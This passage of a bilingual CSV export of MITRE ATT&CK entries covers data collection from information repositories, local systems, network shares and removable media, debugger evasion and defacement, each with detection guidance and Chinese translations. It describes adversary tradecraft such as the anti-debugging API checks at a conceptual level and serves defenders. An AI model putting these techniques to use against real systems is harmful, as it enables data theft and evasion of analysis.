* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources

Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",https://attack.mitre.org/techniques/T1213,18 April 2018,11 April 2022,3.2,Collection,"As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) Sharepoint audit logging can also be configured to report when a user shares a resource. (Citation: Sharepoint Sharing Events) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities. ","Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Logon Session: Logon Session Creation",False,,,"Isif Ibrahima, Mandiant; Milos Stojadinovic; Naveen Vijayaraghavan, Nilesh Dherange (Gurucul); Praetorian; Regina Elwell",,,,,,,"(Citation: CrowdStrike StellarParticle January 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ANSSI Sandworm January 2021),(Citation: ESET ComRAT May 2020),(Citation: Visa FIN6 Feb 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: CISA AA20-259A Iran-Based Actor September 2020),",来自信息存储库的数据/信息存储库中的数据,攻击者可能会利用信息库来挖掘有价值的信息。信息存储库是允许存储信息的工具，通常是为了促进用户之间的协作或信息共享，并且可以存储各种各样的数据，这些数据可以帮助对手实现进一步的目标，或者直接访问目标信息。攻击者还可能滥用外部共享功能与组织外部的收件人共享敏感文档。以下是可能对对手具有潜在价值的示例信息的简要列表，也可以在信息存储库中找到： * 策略、程序和标准 * 物理/逻辑网络图 * 系统架构图 * 技术系统文档 * 测试/ 开发凭据 * 工作/项目时间表 * 源代码片段 * 网络共享和其他内部资源的链接 存储在存储库中的信息可能因特定实例或环境而异。具体的通用信息库包括基于 Web 的平台，例如 [Sharepoint](https://attack.mitre.org/techniques/T1213/002) 和 [Confluence](https://attack.mitre.org/techniques/T1213/ 001)、特定服务，例如代码存储库、IaaS 数据库、企业数据库，以及其他存储基础设施，例如 SQL Server。
T1213.003,Data from Information Repositories: Code Repositories,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",https://attack.mitre.org/techniques/T1213/003,11 May 2021,18 October 2022,1.1,Collection,"Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.",SaaS,"Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,"Itamar Mizrahi, Cymptom; Josh Liburdi, @jshlbrd; Toby Kohlenberg",,,,,,,"(Citation: Microsoft Internal Solorigate Investigation Blog),(Citation: MSTIC DEV-0537 Mar 2022),",来自信息存储库的数据/信息存储库中的数据：代码存储库,攻击者可能会利用代码存储库来收集有价值的信息。代码存储库是存储源代码和自动化软件构建的工具/服务。它们可以在内部或私下托管在第三方网站上，例如 Github、GitLab、SourceForge 和 BitBucket。用户通常通过 Web 应用程序或 git 等命令行实用程序与代码存储库进行交互。一旦攻击者获得对受害者网络或私有代码存储库的访问权限，他们可能会收集敏感信息，例如专有源代码或软件源代码中包含的凭据。有权访问软件的源代码可能允许攻击者开发 [Exploits](https://attack.mitre.org/techniques/T1587/004)，而凭证可以使用 [Valid Accounts](https:// attack.mitre.org/techniques/T1078）。（引文：Wired Uber Breach）（引文：Krebs Adobe）**注意：** 这与 [代码存储库] 不同（https://attack.mitre.org/techniques /T1593/003），专注于通过公共代码存储库进行[侦察]（https://attack.mitre.org/tactics/TA0043）。
T1213.001,Data from Information Repositories: Confluence,"
Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
",https://attack.mitre.org/techniques/T1213/001,14 February 2020,08 June 2021,1.0,Collection,"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

User access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.",SaaS,"Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,,User,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),",来自信息存储库的数据/信息存储库中的数据：Confluence,攻击者可能会利用 Confluence 存储库来挖掘有价值的信息。 Confluence 通常与 Atlassian JIRA 一起出现在开发环境中，通常用于存储与开发相关的文档，但是，通常可能包含更多不同类别的有用信息，例如：* 策略、程序和标准 * 物理/逻辑网络图 *系统架构图 * 技术系统文档 * 测试/开发证书 * 工作/项目时间表 * 源代码片段 * 网络共享和其他内部资源的链接
T1213.002,Data from Information Repositories: Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
",https://attack.mitre.org/techniques/T1213/002,14 February 2020,08 June 2021,1.0,Collection,"The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. 

","Office 365, Windows","Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,,User,,,,,,"(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: RSAC 2015 Abu Dhabi Stefano Maccaglia),(Citation: MSTIC DEV-0537 Mar 2022),",来自信息存储库的数据/信息存储库中的数据：Sharepoint,攻击者可能会利用 SharePoint 存储库作为挖掘有价值信息的来源。 SharePoint 通常会包含有用的信息，让对手了解内部网络和系统的结构和功能。例如，以下是可能对对手具有潜在价值的示例信息列表，也可以在 SharePoint 上找到： * 策略、程序和标准 * 物理/逻辑网络图 * 系统架构图 * 技术系统文档 * 测试/ 开发证书 * 工作/项目时间表 * 源代码片段 * 网络共享和其他内部资源的链接
T1005,Data from Local System,"Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information. Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
",https://attack.mitre.org/techniques/T1005,31 May 2017,19 October 2022,1.5,Collection,"Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Network, Windows, macOS","Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation, Script: Script Execution",False,,,"Austin Clark, @c2defense; William Cain",,,Privileges to access certain files and directories,,,,"(Citation: FireEye Fin8 May 2016),(Citation: Kroll RawPOS Jan 2017),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: Wevtutil Microsoft Documentation),(Citation: trendmicro xcsset xcode project 2020),(Citation: Volexity SolarWinds),(Citation: Symantec Cicada November 2020),(Citation: Fidelis njRAT June 2013),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: McAfee Bankshot),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: TrendMicro Taidoor),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: ESET Crutch December 2020),(Citation: Kaspersky QakBot September 2021),(Citation: GitHub PowerSploit May 2012),(Citation: F-Secure Lazarus Cryptocurrency Aug 2020),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro Pawn Storm 2019),(Citation: Cybereason Bazar July 2020),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: Trend Micro DRBControl February 2020),(Citation: KISA Operation Muzabi),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: ESET ForSSHe December 2018),(Citation: TrendMicro RawPOS April 2015),(Citation: Forcepoint Monsoon),(Citation: Prevailion DarkWatchman 2021),(Citation: NCSC Joint Report Public Tools),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: ESET LightNeuron May 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: RiskIQ Newegg September 2018),(Citation: Trustwave Pillowmint June 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: Scarlet Mimic Jan 2016),(Citation: aptsim),(Citation: McAfee Sharpshooter December 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: S2 Grupo TrickBot June 2017),(Citation: Cybereason PowerLess February 2022),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Novetta Blockbuster RATs),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Securelist Calisto July 2018),(Citation: Profero APT27 December 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: DOJ APT10 Dec 2018),(Citation: Talos Bisonal Mar 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Red Canary 2021 Threat Detection Report March 2021),(Citation: NSA/FBI Drovorub August 2020),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Trend Micro FIN6 October 2019),(Citation: Kaspersky APT Trends Q1 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: Accenture MUDCARP March 2019),(Citation: Github Koadic),(Citation: Cymmetria Patchwork),(Citation: Unit 42 Kazuar May 2017),(Citation: McAfee GhostSecret),(Citation: PaloAlto Patchwork Mar 2018),(Citation: PowerSploit Documentation),(Citation: BlackBerry Amadey 2020),(Citation: Check Point APT34 April 2021),(Citation: McAfee Honeybee),(Citation: Symantec Chafer February 2018),(Citation: US-CERT TA18-074A),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: McAfee Lazarus Jul 2020),(Citation: FireEye APT37 Feb 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Microsoft Actinium February 2022),(Citation: Eset Ramsay May 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Symantec Pasam May 2012),(Citation: Securelist Kimsuky Sept 2013),(Citation: PWC WellMess July 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: F-Secure Cosmicduke),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Group IB APT 41 June 2021),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Talos GravityRAT),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Novetta Blockbuster Loaders),(Citation: Talos ZxShell Oct 2014),(Citation: Lee 2013),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Korean FSI TA505 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: F-Secure The Dukes),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Talos TinyTurla September 2021),(Citation: CyberBit Dtrack),(Citation: ESET Gelsemium June 2021),(Citation: Red Canary Qbot),(Citation: Microsoft GALLIUM December 2019),(Citation: Mandiant APT1),(Citation: RiskIQ British Airways September 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: FireEye APT30),(Citation: CISA WellMail July 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ESET Machete July 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Symantec Linfo May 2012),(Citation: Microsoft POLONIUM June 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Accenture Lyceum Targets November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: ASERT Donot March 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Novetta-Axiom),(Citation: Bitdefender Naikon April 2021),(Citation: Secureworks MCMD July 2019),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Palo Alto Rover),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CISA WellMess July 2020),(Citation: ANSSI Sandworm January 2021),",来自本地系统的数据,攻击者可能会搜索本地系统源，例如文件系统和配置文件或本地数据库，以在渗出之前找到感兴趣的文件和敏感数据。攻击者也可以使用 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 来执行此操作，例如 [cmd](https://attack.mitre.org/software/S0106)作为 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008)，它具有与文件系统交互以收集信息的功能。攻击者还可以在本地系统上使用 [Automated Collection](https://attack.mitre.org/techniques/T1119)。
T1039,Data from Network Shared Drive,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",https://attack.mitre.org/techniques/T1039,31 May 2017,16 June 2022,1.3,Collection,Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).,"Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Content",False,,,David Tayouri,,,Privileges to access network shared drive,CAPEC-639,,,"(Citation: NCC Group Chimera January 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: NHS Digital Egregor Nov 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ESET Gamaredon June 2020),(Citation: Forcepoint Monsoon),(Citation: F-Secure Cosmicduke),(Citation: Eset Ramsay May 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),",来自网络共享驱动器的数据,攻击者可能会在他们已经入侵的计算机上搜索网络共享以查找感兴趣的文件。敏感数据可以通过共享网络驱动器（主机共享目录、网络文件服务器等）从远程系统收集，这些驱动器可在渗出之前从当前系统访问。交互式命令 shell 可能正在使用中，并且 [cmd](https://attack.mitre.org/software/S0106) 中的常用功能可用于收集信息。
T1025,Data from Removable Media,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 

Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",https://attack.mitre.org/techniques/T1025,31 May 2017,15 October 2021,1.2,Collection,Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).,"Linux, Windows, macOS","Command: Command Execution, File: File Access",False,,,William Cain,,,Privileges to access removable media drive and files,,,,"(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: FireEye APT30),(Citation: CheckPoint Naikon May 2020),(Citation: ESET Gamaredon June 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: F-Secure Cosmicduke),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Kaspersky Sofacy),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET Machete July 2019),(Citation: ESET Crutch December 2020),(Citation: Talos Oblique RAT March 2021),(Citation: ESET InvisiMole June 2020),(Citation: Microsoft SIR Vol 19),(Citation: ESET Operation Groundbait),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Cylance Machete Mar 2017),(Citation: Symantec Waterbug Jun 2019),(Citation: Talos GravityRAT),(Citation: Malwarebytes Kimsuky June 2021),(Citation: KISA Operation Muzabi),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Palo Alto Rover),(Citation: Kaspersky TajMahal April 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Eset Ramsay May 2020),(Citation: ESET Sednit USBStealer 2014),",来自可移动媒体的数据,攻击者可能会在他们已经入侵的计算机上搜索连接的可移动媒体以查找感兴趣的文件。敏感数据可以在渗出之前从连接到受感染系统的任何可移动媒体（光盘驱动器、USB 存储器等）中收集。交互式命令 shell 可能正在使用中，并且 [cmd](https://attack.mitre.org/software/S0106) 中的常用功能可用于收集信息。一些对手也可能在可移动媒体上使用 [自动收集](https://attack.mitre.org/techniques/T1119)。
T1622,Debugger Evasion,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

Specific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",https://attack.mitre.org/techniques/T1622,01 April 2022,16 April 2022,1.0,"Defense Evasion, Discovery","Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious [Native API](https://attack.mitre.org/techniques/T1106) function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.

Monitor debugger logs for signs of abnormal and potentially malicious activity.","Linux, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,TruKno,,,,,,,"(Citation: wardle evilquest partii),(Citation: ClearSky Lazarus Aug 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: NCCGroup RokRat Nov 2018),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Talos Group123),(Citation: Malwarebytes Saint Bot April 2021),",调试器规避/反调试技术,攻击者可能会采用各种手段来检测和避开调试器。防御者通常使用调试器来跟踪和/或分析潜在恶意软件有效负载的执行。（引用：ProcessHacker Github）调试器规避可能包括根据检查是否存在指示已调试环境的工件的结果来改变行为。与 [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) 类似，如果攻击者检测到调试器，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可以在删除辅助或附加有效负载之前搜索调试器工件。具体检查将根据目标和/或对手而有所不同，但可能涉及 [Native API](https://attack.mitre.org/techniques/T1106) 函数调用，例如 <code>IsDebuggerPresent()</code> 和<code> NtQueryInformationProcess()</code>，或手动检查进程环境块 (PEB) 的 <code>BeingDebugged</code> 标志。如果在当前进程中引发异常（假设当前的调试器会“吞下”或处理潜在错误），其他调试工件的检查也可能会尝试枚举硬件断点、中断汇编操作码、时间检查或测量值。（引用：hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug) 攻击者可能会在自动发现过程中使用从这些调试器检查中获得的信息来塑造后续行为。也可以通过通过循环 [Native API](https://attack.mitre.org/techniques/T1106) 函数调用（例如 <code>OutputDebugStringW() </code>.（引文：wardle evilquest partii）（引文：Checkpoint Dridex Jan 2021）
T1491,Defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. 
",https://attack.mitre.org/techniques/T1491,08 April 2019,25 March 2022,1.3,Impact,"Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.

","IaaS, Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content",False,,,,,,,,Integrity,,",(Citation: Ready.gov IT DRP)",污染并损坏数据,攻击者可能会修改企业网络内部或外部可用的可视内容，从而影响原始内容的完整性。 [污损](https://attack.mitre.org/techniques/T1491) 的原因包括传递信息、恐吓或声称（可能是虚假的）入侵行为。 [Defacement](https://attack.mitre.org/techniques/T1491) 可能会使用令人不安或令人反感的图像，以引起用户不适，或迫使用户遵守随附的消息。
T1491.002,Defacement: External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",https://attack.mitre.org/techniques/T1491/002,20 February 2020,25 March 2022,1.2,Impact,"Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","IaaS, Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content",True,T1491,,,,,,,Integrity,,"(Citation: UK NCSC Olympic Attacks October 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Ready.gov IT DRP)",污染并损坏数据：外部污染和损坏,攻击者可能会破坏组织外部的系统，以试图传递消息、恐吓或以其他方式误导组织或用户。 [外部污损](https://attack.mitre.org/techniques/T1491/002) 最终可能导致用户不信任系统并质疑/诋毁系统的完整性。面向外部的网站是污损的常见受害者；经常被对手和黑客组织攻击，以推动政治信息或传播宣传。（引文：FireEye 对媒体行业的网络威胁）（引文：Kevin Mandia 对美国参议院情报委员会的声明）（引文：匿名黑客破坏俄罗斯政府网站) [外部污损](https://attack.mitre.org/techniques/T1491/002) 可用作触发事件的催化剂，或作为对组织或政府采取的行动的回应。同样，网站污损也可以用作未来攻击的设置或前兆，例如 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)。（引用：趋势科技深入研究污损）
